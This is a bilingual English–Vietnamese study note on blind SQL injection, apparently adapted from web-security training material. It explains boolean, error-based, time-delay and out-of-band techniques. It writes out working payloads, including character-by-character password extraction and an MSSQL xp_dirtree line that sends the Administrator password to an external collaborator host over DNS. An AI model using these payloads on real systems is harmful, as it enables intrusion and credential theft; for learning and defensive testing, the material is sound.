# Blind SQL injection
> SQLi mù 

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
> SQLi mù xảy ra khi một ứng dụng dễ bị tấn công bởi tiêm SQL, nhưng các phản hồi HTTP của ứng dụng không chứa kết quả của truy vấn SQL liên quan hoặc chi tiết của bất kỳ lỗi cơ sở dữ liệu nào.

Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.
> Nhiều kỹ thuật như tấn công UNION không hiệu quả với các lỗ hổng SQL injection mù. Điều này là do chúng dựa vào khả năng xem kết quả của truy vấn được tiêm trong các phản hồi của ứng dụng. Vẫn có thể khai thác việc tiêm SQL mù để truy cập dữ liệu trái phép, nhưng cần sử dụng các kỹ thuật khác.

# Exploiting blind SQL injection by triggering conditional responses
> Khai thác việc tiêm SQL mù bằng cách kích hoạt phản hồi có điều kiện

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
> Hãy cân nhắc một ứng dụng sử dụng cookie theo dõi để thu thập phân tích về việc sử dụng. Các yêu cầu gửi đến ứng dụng bao gồm một tiêu đề cookie như sau:

```Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4```

When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
> Khi một yêu cầu chứa cookie TrackingId được xử lý, ứng dụng sử dụng truy vấn SQL để xác định xem đây có phải là người dùng đã biết hay không:

```SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'```

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response.
> Truy vấn này dễ bị chèn SQL, nhưng kết quả từ truy vấn sẽ không được trả về cho người dùng. Tuy nhiên, ứng dụng sẽ hoạt động khác nhau tùy thuộc vào việc truy vấn có trả về dữ liệu hay không. Nếu bạn gửi một TrackingId được nhận diện, truy vấn sẽ trả về dữ liệu và bạn sẽ nhận được thông báo "Chào mừng trở lại" trong phản hồi.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
> Hành vi này đủ để khai thác lỗ hổng SQL injection mù. Bạn có thể lấy thông tin bằng cách kích hoạt các phản ứng khác nhau theo điều kiện, tùy thuộc vào điều kiện được tiêm.


To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
> Để hiểu cách khai thác này hoạt động, hãy giả sử hai yêu cầu được gửi chứa các giá trị cookie TrackingId sau đây theo thứ tự:

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
> Giá trị đầu tiên này làm cho truy vấn trả về kết quả, bởi vì điều kiện AND '1'='1 được tiêm là đúng. Kết quả là thông báo "Chào mừng trở lại" được hiển thị.

- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
> Giá trị thứ hai làm cho truy vấn không trả về kết quả, bởi vì điều kiện được tiêm là sai. Thông báo "Chào mừng trở lại" không được hiển thị.

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
> Điều này cho phép chúng ta xác định câu trả lời cho từng điều kiện được tiêm vào, và trích xuất dữ liệu từng phần một.

For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
> Ví dụ, giả sử có một bảng tên là Users với các cột Username và Password, và một người dùng tên là Administrator. Bạn có thể xác định mật khẩu của người dùng này bằng cách gửi một chuỗi các đầu vào để kiểm tra mật khẩu từng ký tự một.

To do this, start with the following input:
> Để làm điều này, bắt đầu với đầu vào sau:

```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm```

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.
> Điều này trả về thông báo "Chào mừng trở lại", cho biết điều kiện được tiêm là đúng, do đó ký tự đầu tiên của mật khẩu lớn hơn m.

Next, we send the following input:
> Tiếp theo, chúng tôi gửi đầu vào sau:

```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't```

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.
> Điều này không trả về thông báo "Chào mừng trở lại", nghĩa là điều kiện được tiêm là sai, do đó ký tự đầu tiên của mật khẩu không lớn hơn t.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:
> Cuối cùng, chúng tôi gửi đầu vào sau, trả về thông báo "Chào mừng trở lại", qua đó xác nhận rằng ký tự đầu tiên của mật khẩu là s:

```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's```


We can continue this process to systematically determine the full password for the Administrator user.
> Chúng ta có thể tiếp tục quá trình này để hệ thống xác định mật khẩu đầy đủ cho người dùng Quản trị viên. 

# Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:
> Tiêm SQL dựa trên lỗi đề cập đến các trường hợp bạn có thể sử dụng thông báo lỗi để trích xuất hoặc suy ra dữ liệu nhạy cảm từ cơ sở dữ liệu, ngay cả trong các ngữ cảnh mù. Các khả năng phụ thuộc vào cấu hình của cơ sở dữ liệu và các loại lỗi bạn có thể kích hoạt:  

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section. For more information, see Exploiting blind SQL injection by triggering conditional errors.
> Bạn có thể có khả năng khiến ứng dụng trả về một phản hồi lỗi cụ thể dựa trên kết quả của một biểu thức boolean. Bạn có thể khai thác điều này theo cách tương tự như các phản ứng có điều kiện mà chúng ta đã xem trong phần trước. Để biết thêm thông tin, hãy xem Khai thác lỗ hổng SQL injection mù bằng cách kích hoạt lỗi có điều kiện. 

- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.
> Bạn có thể có khả năng kích hoạt các thông báo lỗi hiển thị dữ liệu được trả về bởi truy vấn. Điều này thực sự biến các lỗ hổng SQL injection mù thành các lỗ hổng có thể nhìn thấy. Để biết thêm thông tin, hãy xem Trích xuất dữ liệu nhạy cảm thông qua thông báo lỗi SQL chi tiết.  
- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.
> Bạn có thể kích hoạt các thông báo lỗi xuất ra dữ liệu trả về từ truy vấn. Điều này thực sự biến các lỗ hổng SQL injection mù thành các lỗ hổng hiển thị. Để biết thêm thông tin, xem Trích xuất dữ liệu nhạy cảm qua các thông báo lỗi SQL chi tiết.

# Exploiting blind SQL injection by triggering conditional errors
> Khai thác lỗ hổng SQL injection mù bằng cách kích hoạt lỗi có điều kiện   

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.
> Một số ứng dụng thực hiện các truy vấn SQL nhưng hành vi của chúng không thay đổi, bất kể truy vấn có trả về bất kỳ dữ liệu nào hay không. Kỹ thuật trong phần trước sẽ không hoạt động, bởi vì việc tiêm các điều kiện boolean khác nhau không tạo ra sự khác biệt nào đối với phản hồi của ứng dụng.    

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.
> Thường có thể khiến ứng dụng trả về một phản hồi khác tùy thuộc vào việc có xảy ra lỗi SQL hay không. Bạn có thể sửa đổi truy vấn để nó chỉ gây ra lỗi cơ sở dữ liệu nếu điều kiện là đúng. Rất thường xuyên, một lỗi chưa được xử lý do cơ sở dữ liệu đưa ra sẽ gây ra một số khác biệt trong phản hồi của ứng dụng, chẳng hạn như thông báo lỗi. Điều này cho phép bạn suy ra sự thật của tình trạng được tiêm.

To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
> Để xem cách thức hoạt động của tính năng này, giả sử lần lượt hai yêu cầu được gửi chứa các giá trị cookie TrackingId sau:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true:

- With the first input, the CASE expression evaluates to 'a', which does not cause any error.
> Với đầu vào đầu tiên, biểu thức CASE đánh giá là 'a', không gây ra lỗi nào.  
- With the second input, it evaluates to 1/0, which causes a divide-by-zero error.
> Với đầu vào thứ hai, nó đánh giá là 1/0, gây ra lỗi chia cho 0.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
> Nếu lỗi gây ra sự khác biệt trong phản hồi HTTP của ứng dụng, bạn có thể sử dụng lỗi này để xác định xem điều kiện được đưa vào có đúng hay không.

Using this technique, you can retrieve data by testing one character at a time:
> Sử dụng kỹ thuật này, bạn có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

# Extracting sensitive data via verbose SQL error messages
Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an id parameter:
> Cấu hình cơ sở dữ liệu sai đôi khi dẫn đến các thông báo lỗi dài dòng. Chúng có thể cung cấp thông tin có thể hữu ích cho kẻ tấn công. Ví dụ: hãy xem xét thông báo lỗi sau, xảy ra sau khi đưa một trích dẫn vào tham số id:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a WHERE statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.
> Điều này hiển thị toàn bộ truy vấn mà ứng dụng đã tạo bằng dữ liệu đầu vào của chúng tôi. Chúng ta có thể thấy rằng trong trường hợp này, chúng ta đang chèn vào một chuỗi trích dẫn đơn bên trong câu lệnh WHERE. Điều này giúp việc xây dựng một truy vấn hợp lệ có chứa tải trọng độc hại trở nên dễ dàng hơn. Việc nhận xét phần còn lại của truy vấn sẽ ngăn trích dẫn đơn thừa không phá vỡ cú pháp.

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.
> Đôi khi, bạn có thể khiến ứng dụng tạo ra thông báo lỗi có chứa một số dữ liệu được truy vấn trả về. Điều này có hiệu quả biến lỗ hổng chèn SQL mù thành lỗ hổng có thể nhìn thấy được.

You can use the CAST() function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:
> Bạn có thể sử dụng hàm CAST() để đạt được điều này. Nó cho phép bạn chuyển đổi loại dữ liệu này sang loại dữ liệu khác. Ví dụ: hãy tưởng tượng một truy vấn chứa câu lệnh sau:

```CAST((SELECT example_column FROM example_table) AS int)```

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following:
> Thông thường, dữ liệu bạn đang cố đọc là một chuỗi. Việc cố gắng chuyển đổi dữ liệu này thành kiểu dữ liệu không tương thích, chẳng hạn như int, có thể gây ra lỗi tương tự như sau:

```ERROR: invalid input syntax for type integer: "Example data"```

This type of query may also be useful if a character limit prevents you from triggering conditional responses.
> Loại truy vấn này cũng có thể hữu ích nếu giới hạn ký tự ngăn cản bạn kích hoạt phản hồi có điều kiện.


# Exploiting blind SQL injection by triggering time delays
> Khai thác lỗ hổng SQL injection mù bằng cách kích hoạt độ trễ thời gian

If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.
> Nếu ứng dụng phát hiện được lỗi cơ sở dữ liệu khi thực thi truy vấn SQL và xử lý chúng một cách khéo léo thì sẽ không có bất kỳ sự khác biệt nào trong phản hồi của ứng dụng. Điều này có nghĩa là kỹ thuật gây ra lỗi có điều kiện trước đó sẽ không hiệu quả.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
> Trong tình huống này, thường có thể khai thác lỗ hổng chèn SQL mù bằng cách kích hoạt độ trễ thời gian tùy thuộc vào điều kiện được chèn là đúng hay sai. Vì các truy vấn SQL thường được ứng dụng xử lý đồng bộ nên việc trì hoãn việc thực thi truy vấn SQL cũng làm trì hoãn phản hồi HTTP. Điều này cho phép bạn xác định tính xác thực của điều kiện được chèn dựa trên thời gian cần thiết để nhận được phản hồi HTTP.

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
> Các kỹ thuật kích hoạt độ trễ thời gian dành riêng cho loại cơ sở dữ liệu đang được sử dụng. Ví dụ: trên Microsoft SQL Server, bạn có thể sử dụng cách sau để kiểm tra một điều kiện và kích hoạt độ trễ tùy thuộc vào biểu thức có đúng hay không:

```SQL
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

The first of these inputs does not trigger a delay, because the condition 1=2 is false.
> Đầu vào đầu tiên trong số này không gây ra độ trễ vì điều kiện 1=2 là sai.
The second input triggers a delay of 10 seconds, because the condition 1=1 is true.
> Đầu vào thứ hai kích hoạt độ trễ 10 giây, vì điều kiện 1=1 là đúng.
Using this technique, we can retrieve data by testing one character at a time:
> Sử dụng kỹ thuật này, chúng ta có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:

```SQL
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
# Exploiting blind SQL injection using out-of-band (OAST) techniques
> Khai thác lỗ hổng SQL injection mù bằng kỹ thuật ngoài băng tần (OAST)

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
> Một ứng dụng có thể thực hiện cùng một truy vấn SQL như ví dụ trước nhưng thực hiện không đồng bộ. Ứng dụng tiếp tục xử lý yêu cầu của người dùng trong luồng gốc và sử dụng một luồng khác để thực thi truy vấn SQL bằng cookie theo dõi. Truy vấn vẫn dễ bị tấn công bởi SQL SQL, nhưng không có kỹ thuật nào được mô tả cho đến nay sẽ hoạt động. Phản hồi của ứng dụng không phụ thuộc vào truy vấn trả về bất kỳ dữ liệu nào, xảy ra lỗi cơ sở dữ liệu hoặc vào thời gian thực hiện truy vấn.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
> Trong tình huống này, thường có thể khai thác lỗ hổng chèn SQL mù bằng cách kích hoạt các tương tác mạng ngoài băng tần với hệ thống mà bạn kiểm soát. Chúng có thể được kích hoạt dựa trên điều kiện được đưa vào để suy ra từng thông tin một. Hữu ích hơn, dữ liệu có thể được lọc trực tiếp trong tương tác mạng.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.
> Nhiều giao thức mạng có thể được sử dụng cho mục đích này, nhưng thông thường hiệu quả nhất là DNS (dịch vụ tên miền). Nhiều mạng sản xuất cho phép truy cập DNS miễn phí vì chúng cần thiết cho hoạt động bình thường của hệ thống.

The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for Burp Collaborator.
> Công cụ dễ dàng và đáng tin cậy nhất để sử dụng các kỹ thuật ngoài băng tần là Burp Collaborator. Đây là máy chủ cung cấp khả năng triển khai tùy chỉnh các dịch vụ mạng khác nhau, bao gồm cả DNS. Nó cho phép bạn phát hiện khi nào các tương tác mạng xảy ra do gửi tải trọng riêng lẻ đến một ứng dụng dễ bị tấn công. Burp Suite Professional bao gồm một ứng dụng khách tích hợp được định cấu hình để hoạt động với Burp Collaborator ngay lập tức. Để biết thêm thông tin, hãy xem tài liệu về Cộng tác viên Burp.

The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
> Các kỹ thuật kích hoạt truy vấn DNS dành riêng cho loại cơ sở dữ liệu đang được sử dụng. Ví dụ: đầu vào sau trên Microsoft SQL Server có thể được sử dụng để thực hiện tra cứu DNS trên một miền được chỉ định:

```SQL
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

This causes the database to perform a lookup for the following domain:
> Điều này khiến cơ sở dữ liệu thực hiện tra cứu tên miền sau:

0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net


You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.
> Bạn có thể sử dụng Burp Collaborator để tạo một tên miền phụ duy nhất và thăm dò máy chủ Cộng tác viên để xác nhận khi nào xảy ra bất kỳ tra cứu DNS nào.

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
> Sau khi xác nhận cách kích hoạt các tương tác ngoài băng tần, bạn có thể sử dụng kênh ngoài băng tần để lọc dữ liệu khỏi ứng dụng dễ bị tấn công. Ví dụ:

```SQL
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
> Đầu vào này sẽ đọc mật khẩu cho người dùng Quản trị viên, nối thêm miền phụ kích hoạt tra cứu DNS. Tra cứu này cho phép bạn xem mật khẩu đã chụp:

```S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net```

Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.
> Các kỹ thuật ngoài băng tần (OAST) là một cách mạnh mẽ để phát hiện và khai thác việc chèn SQL mù, nhờ khả năng thành công cao và khả năng lọc trực tiếp dữ liệu trong kênh ngoài băng tần. Vì lý do này, kỹ thuật OAST thường được ưu tiên hơn ngay cả trong những tình huống mà các kỹ thuật khai thác mù quáng khác hoạt động hiệu quả.